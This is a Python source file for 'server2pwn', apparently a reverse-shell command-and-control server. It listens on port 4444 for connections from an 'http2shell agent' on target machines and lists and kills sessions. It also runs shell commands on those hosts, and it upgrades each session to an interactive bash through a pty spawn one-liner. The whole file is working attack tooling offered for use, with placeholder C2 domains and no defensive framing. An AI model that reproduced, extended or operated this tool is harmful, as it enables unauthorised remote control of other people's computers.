#!/usr/bin/python3

import socket, sys, os, threading, signal, time, argparse, shutil
from datetime import datetime

reset   = "\033[0m"
red     = "\033[31m"
green   = "\033[38;5;46m"
orange  = "\033[38;5;208m"
white   = "\033[37m"
grey    = "\033[38;5;240m"
bold    = "\033[1m"
dim     = "\033[2m"
italic  = "\033[3m"

c2httpdomain    = "yourc2httpsdomain.com"
c2httpsdomain   = "yourc2httpdomain.com"
c2defaultdomain = "0.0.0.0"

buffer   = 4096
sessions = {}
slock    = threading.Lock()
sid      = [0]
plock    = threading.Lock()

banner = f"""
{bold}
{dim}
                                  {red}___{orange}
{orange}   ________  ______   _____  ____{red}|__ \\{orange} ____ _      ______
{orange}  / ___/ _ \\/ ___/ | / / _ \\/ ___/{red}_/ /{orange}/ __ \\ | /| / / __ \\
{orange} (__  )  __/ /   | |/ /  __/ /  {red}/ __/{orange}/ /_/ / |/ |/ / / / /
{orange}/____/\\___/_/    |___/\\___/_/  {red}/____/{orange} .___/|__/|__/_/ /_/
{orange}                                   /_/
{bold}{red}  + {dim}{white}{italic}server2pwn{reset}
{bold}{red}  + {dim}{white}{italic}author: tom7{reset}
{bold}{red}  + {dim}{white}{italic}github: https://github.com/tom7voldemort{reset}
{bold}{red}  + {dim}{white}{italic}version: 1{reset}
{reset}
"""

prompt = f"\n{red}┌──({white}http2shell@c2{red})\n{red}└─{white}≫ {reset}"


def termwidth():
    try:
        return max(shutil.get_terminal_size().columns, 40)
    except Exception:
        return 80

def innerwidth():
    return termwidth() - 4

def renderbox(title):
    w = innerwidth() - 4
    tl = len(title)
    if tl > w - 2:
        title = title[:w - 5] + "..."
        tl = len(title)
    pl = (w - tl) // 2
    pr = w - pl - tl
    top = f"  {red}┌{'─' * w}┐{reset}"
    mid = f"  {red}│{' ' * pl}{white}{title}{red}{' ' * pr}│{reset}"
    bot = f"  {red}└{'─' * w}┘{reset}"
    return f"\n{top}\n{mid}\n{bot}"

def rendercmdbox(category, commands):
    w = innerwidth()
    cw = max(10, w - 6)
    bw = cw + 2
    cmdw = max(12, cw // 3)
    descw = max(10, cw - cmdw)
    catlabel = f"─ {category} "
    dashtop = max(1, bw - len(catlabel))
    top = f"  {red}┌{catlabel}{'─' * dashtop}┐{reset}"
    bot = f"  {red}└{'─' * bw}┘{reset}"
    rows = [top]
    for cmd, desc in commands:
        ct = cmd if len(cmd) <= cmdw else cmd[:cmdw - 2] + ".."
        dt = desc if len(desc) <= descw else desc[:descw - 2] + ".."
        pad = max(0, cw - cmdw - len(dt))
        rows.append(
            f"  {red}│ {green}{ct:<{cmdw}}{white}{dt}{' ' * pad} {red}│{reset}"
        )
    rows.append(bot)
    return "\n".join(rows)

def renderoutputbox(output):
    w = innerwidth()
    cw = max(10, w - 6)
    bw = cw + 2
    lines = []
    for raw in output.splitlines():
        while len(raw) > cw:
            lines.append(raw[:cw])
            raw = raw[cw:]
        lines.append(raw)
    label = "─ output "
    dashtop = max(1, bw - len(label))
    top = f"  {green}┌{label}{'─' * dashtop}┐{reset}"
    bot = f"  {green}└{'─' * bw}┘{reset}"
    rows = [top]
    for line in lines:
        pad = max(0, cw - len(line))
        rows.append(f"  {green}│ {white}{line}{' ' * pad} {green}│{reset}")
    rows.append(bot)
    return "\n".join(rows)

def renderfield(label, value):
    lw = 14
    return f"  {red}{label:<{lw}}{reset} {white}{value}{reset}"

def renderbullet(symbol, msg, color=None):
    c = color or white
    return f" {c}{symbol} {msg}{reset}"

def renderdivider():
    w = innerwidth()
    return f"  {red}{'─' * (w - 4)}{reset}"

def rendertablerow(cols, widths, color=None):
    c = color or white
    row = "  "
    for i, col in enumerate(cols):
        text = str(col)
        maxw = widths[i]
        if len(text) > maxw:
            text = text[:maxw - 2] + ".."
        row += f"{c}{text:<{maxw}}{reset}"
    return row

def calctablewidths(ratios):
    avail = innerwidth() - 4
    widths = [max(4, int(avail * r)) for r in ratios]
    widths[-1] += avail - sum(widths)
    return widths


def out(msg, end="\n"):
    with plock:
        sys.stdout.write(f"\r{msg}{end}")
        sys.stdout.flush()

def loginfo(m):
    out(f"  {red}[{white}info{red}]{reset} {white}{m}{reset}")

def logwarn(m):
    out(f"  {red}[{white}warn{red}]{reset} {orange}{m}{reset}")

def logerr(m):
    out(f"  {red}[{white}error{red}]{reset} {red}{m}{reset}")

def ts():
    return datetime.now().strftime("%H:%M:%S")


class dns:
    def showinfo():
        for domain in [c2httpsdomain, c2httpdomain, c2defaultdomain]:
            try:
                ip = socket.gethostbyname(domain)
                loginfo(f"c2 dns   : {domain}")
                loginfo(f"resolved : {ip}")
                return
            except Exception:
                continue
        logwarn("dns resolve failed")


class session:
    def add(conn, addr):
        with slock:
            i = sid[0]
            sid[0] += 1
            sessions[i] = {"conn": conn, "addr": addr, "time": ts(), "alive": True}
        return i

    def kill(i):
        with slock:
            if i in sessions:
                sessions[i]["alive"] = False
                try:
                    sessions[i]["conn"].shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    sessions[i]["conn"].close()
                except Exception:
                    pass

    def list():
        with slock:
            snap = dict(sessions)
        if not snap:
            print(renderbullet("⚠", "no active sessions", orange))
            return
        print(renderbox("active sessions"))
        print()
        headers = ["id", "ip", "port", "time", "status"]
        ratios  = [0.08, 0.35, 0.15, 0.22, 0.20]
        widths  = calctablewidths(ratios)
        print(rendertablerow(headers, widths, red))
        print(renderdivider())
        for i, s in snap.items():
            st = f"{green}alive{reset}" if s["alive"] else f"{red}dead{reset}"
            print(rendertablerow(
                [i, s["addr"][0], s["addr"][1], s["time"], st],
                widths, white
            ))
        print()

    def exec(i, command):
        with slock:
            if i not in sessions or not sessions[i]["alive"]:
                print(renderbullet("✘", f"session {i} not found or dead", red))
                return
            conn = sessions[i]["conn"]

        try:
            conn.sendall((command + "\n").encode())
        except Exception:
            print(renderbullet("✘", f"failed to send command to session {i}", red))
            return

        output = b""
        conn.settimeout(3.0)
        try:
            while True:
                chunk = conn.recv(buffer)
                if not chunk:
                    break
                output += chunk
        except socket.timeout:
            pass
        except Exception:
            pass
        finally:
            conn.settimeout(None)

        if output:
            print(renderoutputbox(output.decode(errors="replace")))
        else:
            print(renderbullet("⚠", "no output received", orange))

    def interact(i):
        with slock:
            if i not in sessions or not sessions[i]["alive"]:
                print(renderbullet("✘", f"session {i} not found or dead", red))
                return
            conn = sessions[i]["conn"]
            addr = sessions[i]["addr"]

        os.system("clear")
        print(banner)
        print(renderbox("interactive session"))
        print()
        print(renderfield("session id :", str(i)))
        print(renderfield("address    :", f"{addr[0]}:{addr[1]}"))
        print()
        print(renderbullet("→", "type 'backto' to return to main console", white))
        print(renderdivider())
        print()

        upgrade = b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
        try:
            conn.sendall(upgrade)
        except Exception:
            print(renderbullet("✘", "failed to send pty upgrade", red))
            return

        time.sleep(0.6)

        stop = threading.Event()

        def fromsock():
            conn.settimeout(0.3)
            while not stop.is_set():
                try:
                    data = conn.recv(buffer)
                    if not data:
                        stop.set()
                        return
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                except socket.timeout:
                    continue
                except Exception:
                    stop.set()
                    return

        t1 = threading.Thread(target=fromsock, daemon=True)
        t1.start()

        while not stop.is_set():
            try:
                cmd = input("")
            except (EOFError, KeyboardInterrupt):
                print(renderbullet("⚠", "use 'backto' to exit session", white))
                continue
            if cmd.strip().lower() == "backto":
                stop.set()
                break
            if not cmd.strip():
                continue
            try:
                conn.sendall((cmd + "\n").encode())
            except Exception:
                stop.set()
                break

        t1.join(timeout=1)

        alive = sessions.get(i, {}).get("alive", False)
        print(renderbullet("◀", f"returned to main console — session {i} {'alive' if alive else 'dead'}", red))


def acceptloop(srv):
    while True:
        try:
            conn, addr = srv.accept()
        except Exception:
            break
        i = session.add(conn, addr)
        with plock:
            sys.stdout.write(
                f"\r {green}★  {white}new session [{red}SESSION-{i}{white}]"
                f" connected from {white}{addr[0]}:{addr[1]}{reset}\n"
                f"   {red}↳  {white}type {green}session {i}{white} to interact{reset}\n"
            )
            sys.stdout.flush()


def printhelp():
    os.system("clear")
    print(banner)
    print(renderbox("command reference"))
    print()
    print(rendercmdbox("server", [
        ("help",               "show this help menu"),
        ("session",           "list all active sessions"),
        ("use <id>",       "enter interactive session"),
        ("exec <id> <cmd>",    "execute single command on session"),
        ("kill <id>",          "terminate a session"),
        ("killall",            "terminate all sessions"),
        ("info <id>",          "show session details"),
        ("clear",              "clear terminal screen"),
        ("exit",               "shutdown server"),
    ]))
    print()
    print(rendercmdbox("inside session", [
        ("<command>",  "execute shell command on target"),
        ("backto",     "return to main console"),
    ]))
    print()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-p", "--port", type=int, default=4444)
    args = ap.parse_args()

    os.system("clear")
    print(banner)

    dns.showinfo()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", args.port))
    except OSError as e:
        print(renderbullet("✘", f"bind failed -> {e}", red))
        sys.exit(1)

    srv.listen(20)
    loginfo(f"listening on 0.0.0.0:{args.port}")
    loginfo("waiting for http2shell agent...")
    print()

    threading.Thread(target=acceptloop, args=(srv,), daemon=True).start()
    signal.signal(signal.SIGINT, lambda s, f: print(renderbullet("⚠", "use 'exit' to quit", white)))

    while True:
        try:
            raw = input(prompt).strip()
        except KeyboardInterrupt:
            print(renderbullet("⚠", "use 'exit' to quit", white))
            continue
        except EOFError:
            break

        if not raw:
            continue

        parts = raw.split()
        cmd   = parts[0].lower()

        if cmd == "session":
            session.list()

        elif cmd == "use":
            if len(parts) == 2:
                try:
                    session.interact(int(parts[1]))
                except ValueError:
                    print(renderbullet("✘", "invalid session id", red))
            else:
                print(renderbullet("⚠", "usage: use <id>", red))

        elif cmd == "exec":
            if len(parts) >= 3:
                try:
                    i = int(parts[1])
                    command = " ".join(parts[2:])
                    session.exec(i, command)
                except ValueError:
                    print(renderbullet("✘", "invalid session id", red))
            else:
                print(renderbullet("⚠", "usage: exec <id> <command>", red))

        elif cmd == "kill":
            if len(parts) == 2:
                try:
                    i = int(parts[1])
                    session.kill(i)
                    print(renderbullet("✔", f"session {i} terminated", green))
                except ValueError:
                    print(renderbullet("✘", "invalid session id", red))
            else:
                print(renderbullet("⚠", "usage: kill <id>", red))

        elif cmd == "killall":
            with slock:
                ids = list(sessions.keys())
            for i in ids:
                session.kill(i)
            print(renderbullet("✔", f"{len(ids)} sessions terminated", green))

        elif cmd == "info":
            if len(parts) == 2:
                try:
                    i = int(parts[1])
                    with slock:
                        s = sessions.get(i)
                    if s:
                        print(renderbox(f"session {i}"))
                        print()
                        print(renderfield("id     :", str(i)))
                        print(renderfield("ip     :", s["addr"][0]))
                        print(renderfield("port   :", str(s["addr"][1])))
                        print(renderfield("time   :", s["time"]))
                        print(renderfield("status :", "alive" if s["alive"] else "dead"))
                        print()
                    else:
                        print(renderbullet("✘", f"session {i} not found", red))
                except ValueError:
                    print(renderbullet("✘", "invalid session id", red))
            else:
                print(renderbullet("⚠", "usage: info <id>", red))

        elif cmd == "clear":
            os.system("clear")
            print(banner)

        elif cmd == "help":
            printhelp()

        elif cmd in ("exit", "quit"):
            print(renderbullet("⏻", "shutting down server...", white))
            with slock:
                for s in sessions.values():
                    try:
                        s["conn"].close()
                    except Exception:
                        pass
            srv.close()
            print(renderbullet("✔", "goodbye.", green))
            sys.exit(0)

        else:
            print(renderbullet("✘", f"unknown command: {cmd}", red))
            print(renderbullet("→", "type 'help' for available commands", white))


if __name__ == "__main__":
    main()
